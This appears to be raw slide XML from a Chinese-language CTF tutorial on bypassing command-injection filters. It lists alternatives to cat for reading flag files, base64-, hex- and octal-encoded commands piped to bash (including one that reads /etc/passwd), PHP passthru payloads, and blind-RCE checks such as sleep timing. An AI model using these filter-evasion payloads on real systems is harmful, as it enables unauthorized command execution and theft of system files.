              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>flag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过滤绕过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95020" y="1273810"/>
            <a:ext cx="2990215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读取命令绕过</a:t>
            </a:r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(</a:t>
            </a:r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如</a:t>
            </a:r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cat)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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5020" y="2072005"/>
            <a:ext cx="73831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dirty="0"/>
              <a:t>cat flag.php </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是用于在终端上显示当前目录下名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> flag.php </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的文件的内容。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat /flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是用于在终端上显示根目录下名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的文件的内容。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是用于在终端上显示当前目录下名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的文件的内容。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95020" y="3512185"/>
            <a:ext cx="504317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tac:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>反向显示，从最后一行开始往前显示</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tac /flag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more:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>一页一页显示档案内容</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>more flag.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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less</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>more</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>类似</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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tail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：查看末尾几行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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nl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：显示的时候，顺便输出行号</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     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nl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/flag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7181215" y="3150870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xxd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：读取二进制文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>      xxd /flag</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>grep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：在文本中查找指定字符串</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> passthru("grep fla /fla*");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>10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file -f:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>报错出具体内容</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>       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passthru("file -f /flag");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96535" y="4890770"/>
            <a:ext cx="6818630" cy="132207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p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>file -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>要求后面跟的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>文件列表文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>（里面存的是路径）。假设</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> /flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>文件的内容是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> flag{test123}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>，执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> file -f /flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>时：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>命令会尝试读取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> /flag </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>的内容（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>flag{test123}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>），把它当作</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>要检测的文件路径</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>；系统中不存在名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0"/>
              <a:t> flag{test123} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>的文件，因此会报错：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>flag{test123}: cannot open `flag{test123}' (No such file or directory)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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过滤绕过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95020" y="1273810"/>
            <a:ext cx="4888230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常见文件读取命令绕过</a:t>
            </a:r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(base,hex)</a:t>
            </a:r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endParaRPr lang="zh-CN" altLang="en-US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925" y="1979295"/>
            <a:ext cx="5425440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 b="1" dirty="0"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>编码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "abcd" | base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（命令行进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>加密）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "YWJjzAo=" | base64 -d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（命令行对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解密）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实现输入的命令中没有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>但执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的功能</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "ls" | base64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r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "bHMK" | base64 -d | bash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r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "bHMK" | base64 -d | sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（将命令经过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解码后的命令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>进行执行）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实现输入的命令中没有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>但执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的功能（上面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>要换成</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>cat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cat [file]|base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>还可以用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>base64 [file]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，结果会以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编码形式输出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084060" y="1555750"/>
            <a:ext cx="4481830" cy="2614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000" b="1" dirty="0"/>
              <a:t>hex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>编码（需要装</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>xxd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>命令）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-r </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-p </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>省略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>0x</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "abcd" | xxd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（命令行进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>hex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编码）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "616263640a" | xxd -r -p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（命令行进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>hex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>解码）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "ls" | xxd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r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "6c730a" xxd -r -p | bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo "6c730a" xxd -r -p | sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令）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7084060" y="4594860"/>
            <a:ext cx="44818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b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>八进制（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Octal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）编码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:sym typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>示例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altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")  # cat /etc/passwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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拓展：无回显</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>rce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69925" y="1310005"/>
            <a:ext cx="54260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/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ctf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中，有时会遇到无回显</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>rce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行。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925" y="2332355"/>
            <a:ext cx="4079875" cy="21018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5800" y="4631055"/>
            <a:ext cx="4064000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/>
              <a:t>首先可以通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>延时</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来判断是否进行了命令执行。推荐</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sleep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令。在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sleep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令是用于指定操作系统休眠的命令，例如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sleep 3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的话就是让操作系统休眠</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3s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098030" y="1310005"/>
            <a:ext cx="1487170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tee</a:t>
            </a:r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命令</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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98030" y="3287395"/>
            <a:ext cx="2541270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cp</a:t>
            </a:r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和</a:t>
            </a:r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mv</a:t>
